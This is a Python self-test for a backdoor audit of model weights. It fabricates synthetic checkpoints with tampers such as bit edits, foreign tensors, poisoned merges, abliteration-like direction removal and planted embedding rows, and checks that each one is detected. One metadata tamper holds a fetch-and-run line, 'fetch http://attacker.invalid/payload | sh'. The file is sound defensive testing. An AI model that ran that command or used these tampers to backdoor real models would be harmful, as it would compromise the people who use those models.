# -*- coding: utf-8 -*-
"""Self-test of the backdoor audit: fabricate tampered models and packs, then
check that every tamper is caught and every clean control passes.

The audit tools are only worth what they are measured to catch. This program
builds small synthetic checkpoints (CPU, a few hundred KB), applies a catalogue
of tampers - each one a way to carry something extra that the guide's checks
claim to catch, plus the ones the earlier versions did NOT catch and that the
current versions do - and asserts the verdict for each.

Each row prints  [PASS|FAIL]  expected / observed.  Exit status 0 only when
every row passes. Nothing here executes a payload: a "backdoor" in this test is
a modified tensor, an extra tensor, a stray byte or a metadata string.

Usage:
  <python> audit/selftest.py
"""
from __future__ import annotations

import json
import os
import shutil
import struct
import sys
import tempfile

import torch
from safetensors.torch import save_file

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)
import backdoor_audit as ba  # noqa: E402
import source_audit as sa  # noqa: E402
import st_integrity as sti  # noqa: E402

GS = 16          # ConvRot group size used by the synthetic packs
RESULTS = []


# --- fabrication --------------------------------------------------------------

def make_model(dtype, seed=0, layers=4, dim=64, out=32, vocab=200):
    g = torch.Generator().manual_seed(seed)

    def r(*shape, s=0.02):
        return (torch.randn(*shape, generator=g) * s).to(dtype)

    t = {"m.embeddings.token_embedding.weight": r(vocab, dim)}
    for i in range(layers):
        for name in ("self_attn.q_proj", "self_attn.k_proj", "mlp.fc1", "mlp.fc2"):
            t["m.layers.%d.%s.weight" % (i, name)] = r(out, dim)
            t["m.layers.%d.%s.bias" % (i, name)] = r(out, s=0.01)
    t["m.final_layer_norm.weight"] = (torch.ones(dim) + torch.randn(dim, generator=g) * 0.01).to(dtype)
    return t


def quantize_pack(src, convrot=True):
    """What the converters do: rotate -> per-row amax/127 -> round. Returns
    the pack's tensor dict and its _quantization_metadata."""
    pack, layers = {}, {}
    h = ba.hadamard(GS)
    for k, w in src.items():
        if not (k.endswith(".weight") and w.ndim == 2 and ".layers." in k):
            pack[k] = w.clone()
            continue
        mod = k[: -len(".weight")]
        wf = w.float()
        out_f, in_f = wf.shape
        rot = torch.matmul(wf.view(out_f, in_f // GS, GS), h.T).reshape(out_f, in_f) if convrot else wf
        s = rot.abs().amax(dim=-1, keepdim=True) / 127.0
        q = (rot / s).round().clamp(-127, 127).to(torch.int8)
        cfg = {"format": "int8_tensorwise"}
        if convrot:
            cfg.update({"convrot": True, "convrot_groupsize": GS})
        pack[k] = q
        pack[mod + ".weight_scale"] = s.float().contiguous()
        pack[mod + ".comfy_quant"] = torch.tensor(list(json.dumps(cfg).encode()), dtype=torch.uint8)
        layers[mod] = {"format": "int8_tensorwise"}
    meta = {"_quantization_metadata": json.dumps({"format_version": "1.0", "layers": layers})}
    return pack, meta


def save(path, tensors, meta=None):
    save_file({k: v.contiguous() for k, v in tensors.items()}, path, metadata=meta or {})


def raw_parts(path):
    b = open(path, "rb").read()
    n = struct.unpack("<Q", b[:8])[0]
    return json.loads(b[8:8 + n].decode()), b[8 + n:]


def write_raw(path, header_text, data):
    ht = header_text.encode()
    with open(path, "wb") as f:
        f.write(struct.pack("<Q", len(ht)) + ht + data)


def row(name, expected, observed, ok):
    RESULTS.append(ok)
    print("  [%s] %-52s expected %-22s observed %s" % ("PASS" if ok else "FAIL", name, expected, observed))


# --- pack-level (backdoor_audit) ----------------------------------------------

def pack_case(d, name, tamper, expect_edited, via="provenance", note=""):
    src = make_model(torch.float16)
    pack, meta = quantize_pack(src)
    sp, pp = os.path.join(d, "src.safetensors"), os.path.join(d, name + ".safetensors")
    save(sp, src)
    meta2 = tamper(pack, meta, pp) or meta
    if pack is not None and not os.path.exists(pp):
        save(pp, pack, meta2)
    try:
        r = ba.provenance(sp, pp)
        verdict = r["verdict"]
        st = ba.static_scan(pp)
        if verdict == "FAITHFUL" and st.get("findings"):
            verdict = "FAITHFUL+static"
    except Exception as e:
        verdict = "ERROR(%s)" % type(e).__name__
    ok = (verdict != "FAITHFUL") if expect_edited else (verdict == "FAITHFUL")
    row(name, "EDITED/flagged" if expect_edited else "FAITHFUL", verdict + (" " + note if note else ""), ok)


def run_pack_tests(d):
    print("\n== pack vs source (backdoor_audit.py) ==")

    pack_case(d, "clean-control", lambda p, m, path: None, False)

    def lsb3(p, m, path):
        p["m.layers.1.mlp.fc1.weight"][0, :64] += 3
    pack_case(d, "3-LSB edit of one layer", lsb3, True)

    def scale6(p, m, path):
        p["m.layers.0.self_attn.q_proj.weight_scale"] *= 1.06
    pack_case(d, "6% change of one weight_scale", scale6, True)

    def kept(p, m, path):
        p["m.embeddings.token_embedding.weight"][7, 3] += 0.01
    pack_case(d, "edit of one kept-float weight", kept, True)

    def one_code(p, m, path):
        w = p["m.layers.2.mlp.fc2.weight"]
        w[5, 5] = (w[5, 5].to(torch.int16) + 1).clamp(-127, 127).to(torch.int8)
    pack_case(d, "single int8 code +1 LSB (old gate missed)", one_code, True)

    def bias_edit(p, m, path):
        p["m.layers.3.self_attn.k_proj.bias"][2] += 0.5
    pack_case(d, "BIAS edit (old audit never compared biases)", bias_edit, True)

    def foreign(p, m, path):
        p["assets/note.txt"] = torch.zeros(4, dtype=torch.uint8)
    pack_case(d, "foreign tensor with a non-.weight name", foreign, True)

    def foreign_w(p, m, path):
        p["m.shadow.weight"] = torch.zeros(4, 4)
    pack_case(d, "foreign .weight tensor", foreign_w, True)

    def nan_scale(p, m, path):
        p["m.layers.0.mlp.fc1.weight_scale"][3, 0] = float("nan")
    pack_case(d, "NaN in a weight_scale (NaN beats every gate)", nan_scale, True)

    def orphan(p, m, path):
        p["m.layers.0.self_attn.v_proj.comfy_quant"] = torch.tensor(
            list(json.dumps({"format": "int8_tensorwise"}).encode()), dtype=torch.uint8)
    pack_case(d, "orphan comfy_quant payload", orphan, True)

    def kept_dtype(p, m, path):
        # re-store a kept tensor in another dtype WITH an edit; a dtype change
        # must not exempt it from the value comparison
        t = p["m.final_layer_norm.weight"].float()
        t[0] += 0.05
        p["m.final_layer_norm.weight"] = t
    pack_case(d, "edit hidden inside a dtype change", kept_dtype, True)

    def meta_payload(p, m, path):
        m = dict(m)
        m["note"] = "fetch http://attacker.invalid/payload | sh"
        return m
    pack_case(d, "metadata string carrying a fetch-and-run", meta_payload, True)

    def trailing(p, m, path):
        save(path, p, m)
        with open(path, "ab") as f:
            f.write(b"\x90" * 256)
    pack_case(d, "256 stray bytes after the last tensor", trailing, True)

    def dup_key(p, m, path):
        save(path, p, m)
        hdr, data = raw_parts(path)
        b = open(path, "rb").read()
        n = struct.unpack("<Q", b[:8])[0]
        text = b[8:8 + n].decode().rstrip()
        key = "m.final_layer_norm.weight"
        text = text[:-1] + "," + json.dumps(key) + ":" + json.dumps(hdr[key]) + "}"
        write_raw(path, text, data)
    pack_case(d, "duplicate key in the JSON header", dup_key, True)

    def bad_qmeta(p, m, path):
        m = dict(m)
        q = json.loads(m["_quantization_metadata"])
        q["layers"]["m.ghost.layer"] = {"format": "int8_tensorwise"}
        m["_quantization_metadata"] = json.dumps(q)
        return m
    pack_case(d, "_quantization_metadata declares a ghost layer", bad_qmeta, True)

    # the gap check reads only the header, so it is exercised directly
    src = make_model(torch.float16)
    pack, meta = quantize_pack(src)
    gp = os.path.join(d, "gap.safetensors")
    save(gp, pack, meta)
    hdr, data = raw_parts(gp)
    items = sorted((v["data_offsets"][0], k) for k, v in hdr.items() if k != "__metadata__")
    first_end = hdr[items[0][1]]["data_offsets"][1]
    for _, k in items[1:]:
        hdr[k]["data_offsets"] = [hdr[k]["data_offsets"][0] + 8, hdr[k]["data_offsets"][1] + 8]
    write_raw(gp, json.dumps(hdr), data[:first_end] + b"\0" * 8 + data[first_end:])
    _, f = sti.check(gp)
    row("8-byte gap between two tensors", "container finding",
        "finding" if any("gap" in x for x in f) else "none", any("gap" in x for x in f))

    def clean_nan_kept(p, m, path):
        w = p["m.embeddings.token_embedding.weight"]
        w[0, 0] = float("nan")
    # a kept tensor that is NaN in BOTH source and pack is not an edit
    src = make_model(torch.float16)
    src["m.embeddings.token_embedding.weight"][0, 0] = float("nan")
    pack, meta = quantize_pack(src)
    sp, pp = os.path.join(d, "nsrc.safetensors"), os.path.join(d, "npack.safetensors")
    save(sp, src)
    save(pp, pack, meta)
    r = ba.provenance(sp, pp)
    row("NaN present in source and pack (control)", "FAITHFUL", r["verdict"], r["verdict"] == "FAITHFUL")


# --- source-level (source_audit) ----------------------------------------------

def project_out(t, dim_dir, strength=1.0):
    out = {}
    for k, w in t.items():
        if k.endswith(".weight") and w.ndim == 2 and ".layers." in k:
            out[k] = w - strength * torch.outer(w @ dim_dir, dim_dir)
        else:
            out[k] = w.clone()
    return out


def run_source_tests(d):
    print("\n== source model (source_audit.py) ==")
    base = make_model(torch.float32)
    bp = os.path.join(d, "base.safetensors")
    save(bp, base)
    g = torch.Generator().manual_seed(5)

    # D: identity and the localized edits that a relative-mass threshold misses
    mp = os.path.join(d, "same.safetensors")
    save(mp, base)
    r = sa.base_delta(bp, mp)
    row("model == base", "IDENTICAL", r["verdict"], r["verdict"] == "IDENTICAL")

    one = {k: v.clone() for k, v in base.items()}
    one["m.layers.1.mlp.fc1.weight"][3, 3] += 1e-6
    mp = os.path.join(d, "oneelem.safetensors")
    save(mp, one)
    r = sa.base_delta(bp, mp)
    row("one element changed by 1e-6 (old: IDENTICAL)", "DERIVED", r["verdict"], r["verdict"] == "DERIVED")
    f = sa.delta_structure(bp, mp)
    row("same, delta structure", "MICRO-EDIT", f["verdict"], f["verdict"] == "MICRO-EDIT")

    bias = {k: v.clone() for k, v in base.items()}
    bias["m.layers.0.mlp.fc2.bias"][1] += 0.3
    mp = os.path.join(d, "bias.safetensors")
    save(mp, bias)
    r = sa.base_delta(bp, mp)
    row("bias-only edit (old: bias never compared)", "DERIVED", r["verdict"], r["verdict"] == "DERIVED")

    # D2: clean single-direction removal vs injected multi-direction update
    direction = torch.randn(64, generator=g)
    direction /= direction.norm()
    ab = project_out(base, direction)
    mp = os.path.join(d, "ablit.safetensors")
    save(mp, ab)
    f = sa.delta_structure(bp, mp)
    row("abliteration-like (one direction)", "SINGLE-DIRECTION", f["verdict"], f["verdict"] == "SINGLE-DIRECTION")

    inj = {}
    for k, w in base.items():
        if k.endswith(".weight") and w.ndim == 2 and ".layers." in k:
            u = torch.randn(w.shape[0], 3, generator=g)
            v = torch.randn(3, w.shape[1], generator=g)
            inj[k] = w + 0.02 * (u @ v) / 8
        else:
            inj[k] = w.clone()
    mp = os.path.join(d, "inject.safetensors")
    save(mp, inj)
    f = sa.delta_structure(bp, mp)
    row("injected rank-3 update", "MULTI-DIRECTION", f["verdict"], f["verdict"] == "MULTI-DIRECTION")

    # D2, output side: a real abliteration subtracts ONE residual-stream
    # direction from a layer's OUTPUT, so the shared direction lives in the
    # left singular vectors. Measured on Josiefied-Qwen3-0.6B the output-side
    # coherence is 1.0000 while the input side is 0.016 - a right-only
    # measurement would call that abliteration "scattered".
    out_dir = torch.randn(32, generator=g)
    out_dir /= out_dir.norm()
    outedit = {}
    for k, w in base.items():
        if k.endswith(".weight") and w.ndim == 2 and ".layers." in k and w.shape[0] == 32:
            coef = (w.float().T @ out_dir)
            outedit[k] = (w.float() - 0.05 * float(w.norm()) * torch.outer(out_dir, coef)
                          ).to(w.dtype)
        else:
            outedit[k] = w.clone()
    mp = os.path.join(d, "outside.safetensors")
    save(mp, outedit)
    f = sa.delta_structure(bp, mp)
    row("output-side shared direction (abliteration shape)",
        "output, coherence ~1.0",
        "%s, %.4f" % (f.get("shared_direction"), f.get("coherence_out_max") or 0.0),
        f.get("shared_direction") == "output" and (f.get("coherence_out_max") or 0) >= 0.9)

    # C: merge proof, including the edit below the old flat 1e-4 gate
    pa, pb = make_model(torch.float32, seed=1), make_model(torch.float32, seed=2)
    pap, pbp = os.path.join(d, "pa.safetensors"), os.path.join(d, "pb.safetensors")
    save(pap, pa)
    save(pbp, pb)
    merged = {k: 0.5 * pa[k] + 0.5 * pb[k] for k in pa}
    mp = os.path.join(d, "merge.safetensors")
    save(mp, merged)
    r = sa.parent_reconstruction(mp, [pap, pbp], [0.5, 0.5])
    row("merge 0.5/0.5 exact", "EXACT-MERGE", r["verdict"], r["verdict"] == "EXACT-MERGE")

    merged16 = {k: v.half() for k, v in merged.items()}
    mp16 = os.path.join(d, "merge16.safetensors")
    save(mp16, merged16)
    r = sa.parent_reconstruction(mp16, [pap, pbp], [0.5, 0.5])
    row("merge written into FP16 (rounding only)", "EXACT-MERGE", r["verdict"], r["verdict"] == "EXACT-MERGE")

    pois = {k: v.clone() for k, v in merged.items()}
    pois["m.layers.2.self_attn.q_proj.weight"][4, 4] += 5e-5
    mp = os.path.join(d, "poison_small.safetensors")
    save(mp, pois)
    r = sa.parent_reconstruction(mp, [pap, pbp], [0.5, 0.5])
    row("poisoned merge, element +5e-5 (old gate 1e-4)", "RESIDUAL", r["verdict"], r["verdict"] == "RESIDUAL")

    pois2 = dict(merged)
    pois2["extra.tensor"] = torch.zeros(3)
    mp = os.path.join(d, "poison_extra.safetensors")
    save(mp, pois2)
    r = sa.parent_reconstruction(mp, [pap, pbp], [0.5, 0.5])
    row("poisoned merge, tensor outside the parents", "RESIDUAL", r["verdict"], r["verdict"] == "RESIDUAL")

    # H: upstream identity
    ref = make_model(torch.float32, seed=9)
    refp = os.path.join(d, "ref.safetensors")
    save(refp, ref)
    exp16 = {k: v.half() for k, v in ref.items()}
    mp = os.path.join(d, "up16.safetensors")
    save(mp, exp16)
    r = sa.upstream_identity(refp, mp)
    row("FP16 export of the reference", "UPSTREAM-IDENTICAL", r["verdict"], r["verdict"] == "UPSTREAM-IDENTICAL")

    ulp = {k: v.clone() for k, v in exp16.items()}
    t = ulp["m.layers.0.mlp.fc1.weight"]
    t.view(torch.int16)[0, 0] += 1      # one unit in the last place
    mp = os.path.join(d, "up_ulp.safetensors")
    save(mp, ulp)
    r = sa.upstream_identity(refp, mp)
    row("1-ULP edit vs reference", "DIVERGES", r["verdict"], r["verdict"] == "DIVERGES")

    foreign = dict(exp16)
    foreign["assets/backdoor.py"] = torch.zeros(4, dtype=torch.uint8)
    mp = os.path.join(d, "up_foreign.safetensors")
    save(mp, foreign)
    r = sa.upstream_identity(refp, mp)
    row("foreign tensor vs reference", "DIVERGES", r["verdict"], r["verdict"] == "DIVERGES")

    # A: structure of a source file
    st = sa.static_check(mp)
    row("static check on the foreign-tensor file", "findings", "%d" % len(st["findings"]), bool(st["findings"]))
    mp = os.path.join(d, "trail_src.safetensors")
    save(mp, exp16)
    with open(mp, "ab") as fh:
        fh.write(b"\x00" * 64)
    st = sa.static_check(mp)
    row("source file with 64 stray trailing bytes", "findings", "%d" % len(st["findings"]), bool(st["findings"]))

    # G: a planted embedding row, large and small
    emb = {k: v.clone() for k, v in base.items()}
    emb["m.embeddings.token_embedding.weight"][123] *= 40
    emb["m.embeddings.token_embedding.weight"][77] *= 0.0
    mp = os.path.join(d, "emb.safetensors")
    save(mp, emb)
    rows = {x["row"] for x in sa.embedding_scan(mp)["tables"][0]["top_by_row_norm"]}
    row("planted embedding rows (x40 and zeroed)", "rows 123 and 77", str(sorted(rows & {123, 77})),
        {123, 77} <= rows)


def main():
    d = tempfile.mkdtemp(prefix="audit_selftest_")
    try:
        run_pack_tests(d)
        run_source_tests(d)
    finally:
        shutil.rmtree(d, ignore_errors=True)
    n, ok = len(RESULTS), sum(RESULTS)
    print("\n== %d/%d passed ==" % (ok, n))
    sys.exit(0 if ok == n else 1)


if __name__ == "__main__":
    main()
